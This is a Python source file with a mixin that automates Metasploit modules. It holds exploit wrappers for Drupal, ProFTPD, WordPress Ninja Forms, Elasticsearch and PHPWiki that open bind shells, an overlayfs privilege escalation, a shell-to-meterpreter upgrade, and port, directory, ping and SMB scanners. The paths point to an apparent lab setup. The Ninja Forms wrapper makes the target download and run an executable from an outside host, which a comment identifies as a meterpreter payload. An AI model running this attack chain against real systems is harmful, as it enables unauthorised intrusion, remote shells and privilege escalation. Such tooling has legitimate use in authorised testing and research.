"""Metasploit module wrappers for :class:`MsfClient`.

One method per supported Metasploit module (exploits, privilege escalations,
post modules and scanners). They are kept apart from the RPC/session plumbing in
``msf_client`` and mixed into :class:`MsfClient`, which provides the core methods
and ``logger`` the stubs below declare for the type checker.
"""

import re
import time
from typing import TYPE_CHECKING, Any


def _group1(match: "re.Match[str] | None") -> str:
    assert match is not None
    return match.group(1)


class MsfModuleMixin:
    if TYPE_CHECKING:
        import logging

        logger: logging.Logger

        def run_module(self, module_type: str, module_name: str, module_params: dict[str, Any], payload_name: str | None = None, payload_params: dict[str, Any] | None = None, forced_params: dict[str, Any] | None = None, run_with_console: bool = True, verbose: bool = False) -> Any: ...
        def get_session_id(self, result: str, rhost: str) -> str | None: ...
        def get_sessions(self) -> Any: ...
        def run_shell_command(self, session_id: Any, cmd: str, os: str = "linux") -> str: ...
        def run_msf_command(self, cmd: str) -> str: ...

    def exploit_drupal_coder_exec(self, rhost: str) -> str | None:
        result = self.run_module(
                        module_type = 'exploit',
                        module_name = 'unix/webapp/drupal_coder_exec',
                        module_params = {'RHOSTS': rhost, 'TARGETURI': '/drupal'},
                        payload_name = 'cmd/unix/bind_netcat',
                        payload_params = {'LPORT': 8181},
                )

        return self.get_session_id(result, rhost)

    def exploit_proftpd_modcopy_exec(self, rhost: str) -> str | None:
        result = self.run_module(
                        module_type = 'exploit',
                        module_name = 'unix/ftp/proftpd_modcopy_exec',
                        module_params = {'RHOSTS': rhost, 'SITEPATH': '/var/www/uploads/', 'TARGETURI': '/uploads/'},
                        payload_name = 'cmd/unix/bind_perl',
                        payload_params = {'LPORT': 8181},
                )

        return self.get_session_id(result, rhost)

    def exploit_wp_ninja_forms_unauthenticated_file_upload(self, rhost: str) -> str | None:
        result = self.run_module(
                module_type = 'exploit',
                module_name = 'multi/http/wp_ninja_forms_unauthenticated_file_upload',
                module_params = {'RHOSTS': rhost, 'TARGETURI': '/wordpress/', 'FORM_PATH': 'index.php/king-of-hearts/', 'RPORT': '80', 'AllowNoCleanup': True},
                payload_name = 'php/download_exec',
                payload_params = {'URL': 'http://joo5dahp.wz.cz/7FxWg5fH.exe'}
                # this binary was generated with `msfvenom -p windows/meterpreter/bind_tcp  -f exe -o 7FxWg5fH.exe`
        )

        # start the handler
        result = self.run_module(
                        module_type = 'exploit',
                        module_name = 'multi/handler',
                        module_params = {},
                        payload_name = 'windows/meterpreter/bind_tcp',
                        payload_params = {'RHOST': rhost, 'LPORT': 4444},
                )

        return self.get_session_id(result, rhost)


    def exploit_elasticsearch_script_mvel_rce(self, rhost: str) -> str | None:
        result = self.run_module(
                module_type = 'exploit',
                module_name = 'multi/elasticsearch/script_mvel_rce',
                module_params = {'RHOSTS': rhost},
                payload_name = 'java/meterpreter/bind_tcp',
                payload_params = {'LPORT': 4444},
                forced_params =  {'LHOST': None}
        )

        return self.get_session_id(result, rhost)

    def exploit_phpwiki_ploticus_exec(self, rhost: str) -> str | None:
        result = self.run_module(
                        module_type = 'exploit',
                        module_name = 'multi/http/phpwiki_ploticus_exec',
                        module_params = {'RHOSTS': rhost, 'TARGETURI': '/phpwiki/'},
                        payload_name = 'generic/shell_bind_tcp',
                        payload_params = {'LPORT': 8181, 'encoder': 'php/base64'}
                )

        return self.get_session_id(result, rhost)

    def privesc_overlayfs_priv_esc(self, rhost: str, session_id: Any) -> str | None:
        result = self.run_module(
                        module_type = 'exploit',
                        module_name = 'linux/local/overlayfs_priv_esc',
                        module_params = {'SESSION': session_id, 'target': 0}, # TODO: target maybe needs to be a property
                        payload_name = 'linux/x86/shell/bind_tcp',
                        payload_params = {'RHOST': rhost, 'LPORT': 8181},
                )

        return self.get_session_id(result, rhost)

    def post_shell_to_meterpreter(self, session_id: Any) -> str | None:
        self.run_module(
                        module_type = 'post',
                        module_name = 'multi/manage/shell_to_meterpreter',
                        module_params = {'SESSION': session_id, 'LPORT': 8181, 'HANDLER': False, 'PAYLOAD_OVERRIDE': 'linux/x86/meterpreter/bind_tcp'} # works only on linux machines
                )

        time.sleep(5)

        # start the handler
        rhost = self.get_sessions()[str(session_id)]['target_host']
        result = self.run_module(
                        module_type = 'exploit',
                        module_name = 'multi/handler',
                        module_params = {},
                        payload_name = 'linux/x86/meterpreter/bind_tcp',
                        payload_params = {'RHOST': rhost, 'LPORT': 8181},
                )

        return self.get_session_id(result, rhost)

    def scan_portscan(self, rhosts: str, ports: str, threads: int = 10) -> list[str]:
        result = self.run_module(
                        module_type = 'auxiliary',
                        module_name = 'scanner/portscan/tcp',
                        module_params = {'RHOSTS': rhosts, 'PORTS': ports, 'THREADS': threads},
                )

        result = [line for line in result.split('\n') if 'TCP OPEN' in line]
        result = [_group1(re.match(r".*- ([\.\d:]+) - .*", x)) for x in result]

        self.logger.info(f"Scan result: {result}")

        return result

    def scan_dir_scanner(self, rhosts: str, port: str, threads: int = 1) -> list[str]:
        result = self.run_module(
                module_type = 'auxiliary',
                module_name = 'scanner/http/dir_scanner',
                module_params = {'RHOSTS': rhosts, 'RPORT': port, 'THREADS': threads, 'DICTIONARY': '/vagrant/http_dir.txt'},
                run_with_console = True
        )
        result = [line for line in result.split('\n') if '[+] Found' in line and ' 200 ' in line]
        print(result)
        result = [_group1(re.match(r".*https?://.+/(.+)/ [0-9]+ .*", x)) for x in result]

        self.logger.info(f"Folders found on the Http service: {result}")
        return result

    def scan_ping_sweep(self, rhosts: str, session_id: Any) -> list[str]:
        result = self.run_module(
                        module_type = 'post',
                        module_name = 'multi/gather/ping_sweep',
                        module_params = {'RHOSTS': rhosts, 'SESSION': session_id}
                )

        result = [line for line in result.split('\n') if 'host found' in line]
        result = [_group1(re.match(r".*\t([\.\d]+) .*", x)) for x in result]

        self.logger.info(f"Scan result: {result}")
        return result

    def scan_os_smb(self, rhost: str) -> list[str | None]:
        result = self.run_module(
                        module_type = 'auxiliary',
                        module_name = 'scanner/smb/smb_version',
                        module_params = {'RHOSTS': rhost},
                        run_with_console = True
        )
        nresult = []
        for line in result.split('\n'):
            if 'Host is running' in line:
                nresult.append('linux' if 'Samba' in line else 'windows' if 'Windows' in line else None)
            elif 'Host could not be identified:' in line:
                nresult.append('linux' if 'Samba' in line else 'windows' if re.search(r"Windows.*Windows", line) is not None else None)

        self.logger.info(f"Scan result: {nresult}")
        return nresult

    # def scan_os_nmap(self, rhost):
    #       output = self.run_msf_command(f"sudo nmap -O {rhost}") # TODO use of proxychains ??

    #       result = [line for line in output.split('\n') if line.startswith('Running:') ]
    #       nresult = []
    #       for line in result:
    #               if "Windows" in line:
    #                       nresult.append("windows")
    #               elif "Linux" in line:
    #                       nresult.append("linux")

    #       self.logger.info(f"Scan result: {nresult}")
    #       return nresult

    def get_os_by_cmd(self, session_id: Any) -> str | None:
        if "Linux" in self.run_shell_command(session_id, "uname"):
            return "linux"

        if "Windows" in self.run_shell_command(session_id, "cmd /c ver", os='windows'): # doesn't work before windows 2000
            return "windows"

        if "Linux" in self.run_shell_command(session_id, "cat /proc/version"):
            return "linux"

        self.logger.warning(f"Os detection failed for session {session_id}")
        return None

    def is_session_meterpreter(self, session_id: Any) -> bool:
        sessions = self.get_sessions()
        if session_id not in sessions:
            self.logger.warning(f"Impossible to check session type, session {session_id} not found")
            return False

        return bool(sessions[session_id]["type"] == 'meterpreter')
